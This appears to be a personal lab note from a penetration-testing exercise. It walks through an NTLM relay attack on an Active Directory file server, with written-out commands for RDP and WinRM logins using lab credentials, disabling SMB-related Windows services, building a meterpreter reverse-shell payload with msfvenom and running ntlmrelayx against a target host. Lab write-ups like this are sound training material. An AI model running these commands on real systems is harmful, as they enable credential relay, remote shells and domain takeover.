
```
DC-SRV01
10.201.11.30
```

```
S-SRV02
10.201.11.32
```
I will see how can i craft a NTLM so that i could catch it.


Let's get the RDP for 10.201.11.35
```
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.201.11.35 /u:'Sardarji' /p:'Password123!'
```


And will check if we have the access to the SMB this way
```
\\10.201.11.30
```
![[Pasted image 20240907153943.png]]


```
\\10.201.11.32
```
![[Pasted image 20240907154138.png]]

I also tend to check for ping 
![[Pasted image 20240907164157.png]]

So it's clear that one is refusing and one is not so the victim will be 10.201.11.30
But let's see how NTLM works as i didn't know how the algo works like i now we can only relay it but cannot replay it.

Now that we understand what an NTLM hash is and how it is hashed, we can look at how it responds and requests and why it can only be relayed and not replayed.

```
evil-winrm -u Sardarji -p 'Password123!' -i 10.201.11.35 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network 
```


 Lots of File Server Shares are often auto-mounted via Startup Scripts when a user logs onto their Account, this making it the best option in my opinion


If all users in an AD Domain have a folder that auto-mounts, you simply need to compromise: 
- the File Server, 
- gain local Administrative Rights, 
and execute this attack and play the waiting game for a Domain/Enterprise Admin to log into their account and then it’s game over.

https://blog.spookysec.net/remote-ntlm-relaying/

```
sc stop netlogon
```

```
sc stop lanmanserver
```

```
sc config lanmanserver start= disabled
```

```
sc stop lanmanworkstation
```

```
sc config lanmanworkstation start= disabled
```

![[Pasted image 20240907170321.png]]

RESTART THE MACHINE


Now we have to configure the meterpreter shell through MSF console.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe > meterpreter_shell.exe
```


Setup up the multi handler and run it 


After than run the NTLMrelayx.py

```
sudo ntlmrelayx.py -t smb://10.201.11.30 -smb2support -socks
```